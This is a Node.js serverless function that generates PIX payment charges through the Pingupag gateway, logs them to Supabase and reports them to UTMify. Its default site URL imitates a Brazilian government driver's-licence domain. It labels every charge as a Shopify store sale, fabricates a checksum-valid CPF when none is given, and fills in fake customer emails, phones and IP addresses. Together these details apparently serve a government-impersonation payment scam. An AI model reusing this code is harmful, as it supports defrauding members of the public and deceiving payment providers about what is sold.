const { getSupabase } = require("./lib/supabase");

const PINGUPAG_BASE    = "https://app.pingupag.com";
const PINGUPAG_API_KEY = process.env.PINGUPAG_API_KEY;
const UTMIFY_TOKEN     = process.env.UTMIFY_TOKEN;
const SUPABASE_URL     = process.env.NEXT_PUBLIC_SUPABASE_URL;
const SUPABASE_KEY     = process.env.SUPABASE_SERVICE_ROLE_KEY;

// Cache UTMify para evitar duplicatas
const utmifyCache = new Map();
const CACHE_TTL   = 60000;

function getApiKey() {
  if (!PINGUPAG_API_KEY) {
    throw new Error("PINGUPAG_API_KEY não configurada");
  }
  return PINGUPAG_API_KEY;
}

async function sendUtmify(transactionId, status, customer, amountCents, createdAt, utms) {
  if (utmifyCache.has(transactionId)) {
    console.log("[UTMify] Skipping duplicate for:", transactionId);
    return;
  }
  utmifyCache.set(transactionId, true);
  setTimeout(() => utmifyCache.delete(transactionId), CACHE_TTL);

  try {
    const gatewayFeeCents = Math.round(amountCents * 0.02);
    const netCents        = amountCents - gatewayFeeCents;

    const payload = {
      orderId:      transactionId,
      platform:     "Pingupag",
      paymentMethod: "pix",
      status,
      createdAt:    createdAt || new Date().toISOString().replace("T", " ").slice(0, 19),
      approvedDate: status === "paid" ? new Date().toISOString().replace("T", " ").slice(0, 19) : null,
      customer: {
        name:     customer.name     || null,
        email:    customer.email    || null,
        phone:    customer.phone    || null,
        document: customer.cpf      || null,
        country:  "BR",
        ip:       "177.0.0.1",
      },
      products: [{
        id:           "loja-shopify-br-001",
        name:         "SHOPIFY LOJA 03",
        quantity:     1,
        priceInCents: amountCents,
      }],
      trackingParameters: {
        utm_source:   utms?.utm_source   || null,
        utm_campaign: utms?.utm_campaign || null,
        utm_medium:   utms?.utm_medium   || null,
        utm_content:  utms?.utm_content  || null,
        utm_term:     utms?.utm_term     || null,
        src:          utms?.src          || null,
        sck:          utms?.sck          || null,
      },
      commission: {
        totalPriceInCents:      amountCents,
        gatewayFeeInCents:      gatewayFeeCents,
        userCommissionInCents:  netCents,
        currency:               "BRL",
      },
    };

    const controller = new AbortController();
    const timeoutId  = setTimeout(() => controller.abort(), 3000);

    await fetch("https://api.utmify.com.br/api-credentials/orders", {
      method:  "POST",
      headers: { "Content-Type": "application/json", "x-api-token": UTMIFY_TOKEN },
      body:    JSON.stringify(payload),
      signal:  controller.signal,
    });
    clearTimeout(timeoutId);

    console.log("[UTMify] ✓ Enviado para:", transactionId);
  } catch (err) {
    console.error("[UTMify] Erro (não bloqueia):", err.message);
  }
}

function jsonResponse(statusCode, body) {
  return {
    statusCode,
    headers: {
      "Content-Type":                "application/json; charset=utf-8",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
    },
    body: JSON.stringify(body),
  };
}

function fmtPhone(phone) {
  if (!phone) return "11999999999";
  return phone.replace(/\D/g, "").slice(0, 11) || "11999999999";
}

function gerarCpfValido() {
  const d = Array.from({ length: 9 }, () => Math.floor(Math.random() * 9));

  let soma = d.reduce((acc, v, i) => acc + v * (10 - i), 0);
  let resto = soma % 11;
  d[9] = resto < 2 ? 0 : 11 - resto;

  soma = d.reduce((acc, v, i) => acc + v * (11 - i), 0);
  resto = soma % 11;
  d[10] = resto < 2 ? 0 : 11 - resto;

  return d.join("");
}

exports.handler = async (event) => {
  console.log("[PIX-PINGUPAG] ===== FUNÇÃO INICIADA =====");
  console.log("[PIX-PINGUPAG] PINGUPAG_API_KEY exists:", !!PINGUPAG_API_KEY);

  if (!PINGUPAG_API_KEY) {
    console.error("❌ PINGUPAG_API_KEY não configurada na Netlify!");
    return jsonResponse(500, {
      success: false,
      error:   "Credenciais da gateway não configuradas",
      debug:   "PINGUPAG_API_KEY não encontrada",
    });
  }

  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 204,
      headers: {
        "Access-Control-Allow-Origin":  "*",
        "Access-Control-Allow-Headers": "Content-Type, Authorization",
        "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
      },
      body: "",
    };
  }

  let body = {};
  try { body = event.body ? JSON.parse(event.body) : {}; } catch { body = {}; }

  // ── Normalizar amount ──────────────────────────────────────────────────────
  const rawAmount  = body.amount ?? body.valor ?? body.total ?? 65.70;
  const amountReais = Number(rawAmount) || 65.70;
  const amountCents = Math.round(amountReais * 100);

  // ── Dados do cliente ───────────────────────────────────────────────────────
  const randId        = Math.random().toString(36).slice(2, 10);
  const customerName  = (body.nome || body.name  || body.customer_name  || `Cliente ${randId}`).toString().trim();
  const customerEmail = (body.email || body.customer_email || `cliente${randId}@gmail.com`).toString().trim();
  const customerPhone = fmtPhone(body.phone || body.customer_phone || "11999999999");
  const cpfRaw        = (body.cpf  || body.document || body.customer_cpf || "").toString().replace(/\D/g, "");
  const customerCpf   = cpfRaw.length === 11 ? cpfRaw : gerarCpfValido();
  const utms          = body.utm || {};

  // ── Reference única ────────────────────────────────────────────────────────
  const reference = body.reference || `AVENPAY-${Date.now()}-${randId}`;

  // URL de postback para esta transação
  const siteUrl    = process.env.URL || "https://cnh-brasil-gov-br.netlify.app";
  const postbackUrl = `${siteUrl}/.netlify/functions/webhook-pingupag`;

  console.log("[PIX-PINGUPAG] Amount:", amountReais, "Cents:", amountCents);
  console.log("[PIX-PINGUPAG] Customer:", { name: customerName, email: customerEmail });

  // ── Payload Pingupag ───────────────────────────────────────────────────────
  const payload = {
    amount:       amountCents,
    description:  "SHOPIFY LOJA 03",
    reference,
    postback_url: postbackUrl,
    source:       "api_externa",
    customer: {
      name:     customerName,
      email:    customerEmail,
      phone:    customerPhone,
      document: customerCpf,
    },
    tracking: {
      utm_source:   utms.utm_source   || null,
      utm_campaign: utms.utm_campaign || null,
      utm_medium:   utms.utm_medium   || null,
      utm_content:  utms.utm_content  || null,
      utm_term:     utms.utm_term     || null,
      src:          utms.src          || null,
      sck:          utms.sck          || null,
    },
  };

  // Remove nulls do tracking para não poluir o payload
  Object.keys(payload.tracking).forEach(k => {
    if (payload.tracking[k] === null) delete payload.tracking[k];
  });

  let apiKey;
  try {
    apiKey = getApiKey();
  } catch (err) {
    return jsonResponse(500, { success: false, error: err.message });
  }

  try {
    const controller = new AbortController();
    const timeout    = setTimeout(() => controller.abort(), 30000);

    const resp = await fetch(`${PINGUPAG_BASE}/gateway/v1/transaction`, {
      method:  "POST",
      headers: {
        "Content-Type": "application/json",
        "X-API-Key":    apiKey,
      },
      body:   JSON.stringify(payload),
      signal: controller.signal,
    });
    clearTimeout(timeout);

    const text = await resp.text();

    if (!resp.ok) {
      let errMsg = text;
      try { errMsg = JSON.parse(text)?.message || errMsg; } catch {}
      console.error("[Pingupag] Erro HTTP:", resp.status, errMsg);
      return jsonResponse(resp.status, {
        success: false,
        error:   errMsg,
        debug:   { status: resp.status, body: text.substring(0, 300) },
      });
    }

    let parsed = {};
    try { parsed = JSON.parse(text); } catch {
      console.error("[Pingupag] Parse error:", text.substring(0, 200));
      return jsonResponse(500, {
        success: false,
        error:   "Resposta inválida da gateway",
        debug:   text.substring(0, 200),
      });
    }

    // Pingupag retorna: { status, transaction_id, id, qr_code, qr_code_base64, amount, expires_at }
    if (parsed.status !== "success") {
      console.error("[Pingupag] Resposta com status de erro:", parsed);
      return jsonResponse(502, {
        success: false,
        error:   parsed.message || "Gateway retornou erro",
        debug:   parsed,
      });
    }

    const transactionId = String(parsed.transaction_id || parsed.id);
    const pixCode       = parsed.qr_code       || null;
    const pixBase64     = parsed.qr_code_base64 || null;

    if (!transactionId || !pixCode) {
      console.error("[Pingupag] Resposta incompleta:", { transactionId, pixCode: !!pixCode });
      return jsonResponse(500, {
        success: false,
        error:   "Gateway retornou resposta incompleta",
        debug:   { transaction: transactionId, pix: !!pixCode },
      });
    }

    console.log("[PIX-PINGUPAG] ===== PIX GERADO COM SUCESSO =====");
    console.log("[PIX-PINGUPAG] Transaction ID:", transactionId);
    console.log("[PIX-PINGUPAG] Reference:", reference);

    // ── Salvar no Supabase (não bloqueia) ──────────────────────────────────
    if (SUPABASE_URL && SUPABASE_KEY) {
      try {
        const supabase = getSupabase();
        await supabase.from("transactions").insert({
          transaction_id:  transactionId,
          amount:          amountReais,
          customer_name:   customerName,
          customer_email:  customerEmail,
          customer_cpf:    customerCpf,
          customer_phone:  customerPhone,
          status:          "pending",
          brcode:          pixCode,
          gateway:         "pingupag",
          external_ref:    reference,
          utm_source:      utms.utm_source   || null,
          utm_campaign:    utms.utm_campaign || null,
          utm_medium:      utms.utm_medium   || null,
          utm_content:     utms.utm_content  || null,
          utm_term:        utms.utm_term     || null,
        });
        console.log("[Supabase] ✓ Salvo:", transactionId);
      } catch (err) {
        console.error("[Supabase] Erro (continuando):", err.message);
      }
    }

    // ── Notificar UTMify (não bloqueia) ────────────────────────────────────
    sendUtmify(
      transactionId,
      "waiting_payment",
      { name: customerName, email: customerEmail, phone: customerPhone, cpf: customerCpf },
      amountCents,
      new Date().toISOString().replace("T", " ").slice(0, 19),
      utms
    ).catch(err => console.error("[SendUtmify] Erro:", err.message));

    return jsonResponse(200, {
      success:        true,
      pixCode,
      pix_code:       pixCode,
      brcode:         pixCode,
      payload:        pixCode,
      qr_code:        pixCode,
      qr_code_base64: pixBase64,
      qr_code_image:  pixBase64,
      transaction_id: transactionId,
      transactionId,
      deposit_id:     transactionId,
      reference,
      expires_at:     parsed.expires_at || null,
      status:         "pending",
    });

  } catch (err) {
    console.error("[PIX-PINGUPAG] Erro ao chamar gateway:", err.message);
    return jsonResponse(502, {
      success: false,
      error:   "Falha ao conectar com gateway: " + String(err),
    });
  }
};
